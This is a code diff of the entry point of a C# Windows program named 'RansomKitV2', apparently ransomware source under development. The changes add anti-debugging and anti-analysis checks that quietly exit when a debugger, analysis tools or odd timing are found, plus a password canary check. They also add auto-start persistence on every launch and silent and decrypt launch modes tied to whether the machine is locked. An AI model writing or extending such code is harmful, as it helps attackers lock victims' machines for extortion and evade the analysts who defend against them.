@@ -1,49 +1,47 @@
 using System;
-using System.Diagnostics;
+using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
 namespace RansomKitV2
 {
+    public enum LaunchMode { Normal, Silent, Decrypt }
+
     internal static class Program
     {
         [STAThread]
         static void Main(string[] args)
         {
-            // 1. Anti-Crack Check (Malicious Processes, Debuggers, VM Timing)
-            // We use #if !DEBUG so it doesn't kill the app while you test it in Visual Studio!
 #if !DEBUG
-            if (MaliciousProcessScanner.IsDebuggerPresent() ||
-                MaliciousProcessScanner.IsMaliciousProcessPresent() ||
-                MaliciousProcessScanner.IsTimingSuspicious())
-            {
-                Environment.FailFast("Security violation detected.");
-            }
+            if (IsDebuggerPresent()) Environment.Exit(0);
+            if (AntiCrackEngine.IsMaliciousProcessPresent()) Environment.Exit(0);
+            if (AntiCrackEngine.IsTimingSuspicious()) Environment.Exit(0);
+
+            // anti-tamper canary on VerifyPassword
+            if (!CryptoEngine.VerifyPassword(CryptoEngine.MasterKeyString)) Environment.Exit(0);
+            if (CryptoEngine.VerifyPassword("__wrong_canary_probe__")) Environment.Exit(0);
 #endif
 
-            try
-            {
-                Application.EnableVisualStyles();
-                Application.SetCompatibleTextRenderingDefault(false);
+            // Register auto-start on every launch — idempotent.
+            Persistence.EnsureAutoStart();
 
-                LaunchMode mode = LaunchMode.Normal;
-                if (args.Length > 0)
-                    mode = args[0].ToLower() switch
-                    {
-                        "--silent" => LaunchMode.Silent,
-                        "--decrypt" => LaunchMode.ManualDecrypt,
-                        _ => LaunchMode.Normal
-                    };
-
-                Application.Run(new MainForm(mode));
-            }
-            catch (Exception ex)
+            LaunchMode mode = LaunchMode.Normal;
+            foreach (var a in args)
             {
-                MessageBox.Show(
-                    $"Startup error:\n{ex.Message}\n\n{ex.StackTrace}",
-                    "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                if (string.Equals(a, "--silent", StringComparison.OrdinalIgnoreCase)) mode = LaunchMode.Silent;
+                else if (string.Equals(a, "--decrypt", StringComparison.OrdinalIgnoreCase)) mode = LaunchMode.Decrypt;
             }
+
+            // Silent on an already-unlocked machine = no-op.
+            if (mode == LaunchMode.Silent && !Persistence.IsLocked())
+                Environment.Exit(0);
+
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.SetHighDpiMode(HighDpiMode.SystemAware);
+            Application.Run(new MainForm(mode));
         }
-    }
 
-    internal enum LaunchMode { Normal, Silent, ManualDecrypt }
+        [DllImport("kernel32.dll")]
+        private static extern bool IsDebuggerPresent();
+    }
 }
